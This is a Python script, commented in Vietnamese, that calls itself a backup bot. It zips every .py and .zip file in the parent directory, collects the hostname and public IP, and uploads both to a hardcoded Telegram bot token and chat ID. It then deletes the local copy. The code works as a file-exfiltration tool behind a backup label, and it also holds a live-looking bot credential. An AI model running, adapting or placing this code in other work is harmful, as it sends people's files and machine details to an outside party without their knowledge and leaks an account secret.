import psutil
import requests
import socket
import os
import zipfile
import time

# Cấu hình Telegram
TOKEN = "8695307032:AAEPVyHyyUG7pGhmXZpvFdF1GfZRm8XspIM"
CHAT_ID = "7781661569"

# Cấu hình đường dẫn: Lùi lại 1 cấp so với thư mục hiện tại
FOLDER_TO_SCAN = os.path.abspath(os.path.join(os.getcwd(), ".."))
ZIP_FILENAME = "Backup_Pro_Update.zip"
ZIP_PATH = os.path.join(os.getcwd(), ZIP_FILENAME)

# Danh sách thư mục rác/hệ thống cần bỏ qua để tăng tốc
EXCLUDED_DIRS = ['node_modules', '__pycache__', '.git', '.venv', 'venv', 'env', '.idea', '.vscode']

def get_system_report(file_size_mb):
    """Báo cáo cấu hình và tình trạng file"""
    hostname = socket.gethostname()
    try:
        ip_pub = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip_pub = "Không xác định"
    
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()

    report = (
        f"🛡️ *BẢN BACKUP NÂNG CẤP*\n"
        f"📂 Phạm vi: `Lùi 1 cấp thư mục`\n"
        f"📍 Máy: `{hostname}` | IP: `{ip_pub}`\n"
        f"📊 CPU: {cpu}% | RAM: {ram.percent}%\n"
        f"📦 Dung lượng ZIP: `{file_size_mb:.2f} MB`"
    )
    return report

def build_zip():
    """Quét, lọc file và nén cực đại"""
    print(f"🛰️ Đang quét: {FOLDER_TO_SCAN}")
    try:
        with zipfile.ZipFile(ZIP_PATH, 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
            for root, dirs, files in os.walk(FOLDER_TO_SCAN):
                
                # Loại bỏ các thư mục rác ngay từ bước quét để chạy cực nhanh
                dirs[:] = [d for d in dirs if d not in EXCLUDED_DIRS]

                for file in files:
                    # ĐIỀU KIỆN LỌC:
                    # 1. Phải là file .py hoặc .zip
                    # 2. KHÔNG lấy file __init__.py
                    # 3. Không lấy chính file bot đang chạy và file zip đang tạo
                    if not (file.endswith('.py') or file.endswith('.zip')):
                        continue
                    if file == "__init__.py":
                        continue
                    if file == os.path.basename(__file__) or file == ZIP_FILENAME:
                        continue
                    
                    file_path = os.path.join(root, file)
                    if os.path.islink(file_path): # Bỏ qua các đường dẫn ảo
                        continue
                    
                    try:
                        arcname = os.path.relpath(file_path, FOLDER_TO_SCAN)
                        zipf.write(file_path, arcname)
                    except (PermissionError, FileNotFoundError, OSError):
                        pass
        return True
    except Exception as e:
        print(f"❌ Lỗi nén: {e}")
        return False

def run_bot():
    url_msg = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

    if build_zip() and os.path.exists(ZIP_PATH):
        file_size_mb = os.path.getsize(ZIP_PATH) / (1024 * 1024)
        
        # Gửi báo cáo
        requests.post(url_msg, data={"chat_id": CHAT_ID, "text": get_system_report(file_size_mb), "parse_mode": "Markdown"})
        
        # Kiểm tra giới hạn 50MB của Telegram
        if file_size_mb > 49.5:
            msg = f"⚠️ File nặng `{file_size_mb:.2f}MB`, vượt giới hạn 50MB của Telegram. Hãy kiểm tra trực tiếp trên máy."
            requests.post(url_msg, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
        else:
            # Gửi file kèm định dạng chuẩn để iOS xem được luôn
            print(f"🚀 Đang gửi file lên Telegram...")
            with open(ZIP_PATH, 'rb') as f:
                files = {"document": (ZIP_FILENAME, f, "application/zip")}
                response = requests.post(
                    url_doc, 
                    data={"chat_id": CHAT_ID, "caption": "✅ Backup hoàn tất (Không __init__, .py & .zip)"}, 
                    files=files
                )
                
            if response.status_code == 200:
                print("✅ Thành công!")
                os.remove(ZIP_PATH) # Xóa file tạm sau khi gửi xong
            else:
                print(f"❌ Telegram từ chối: {response.text}")
    else:
        print("❌ Không thể tạo file backup.")

if __name__ == "__main__":
    run_bot()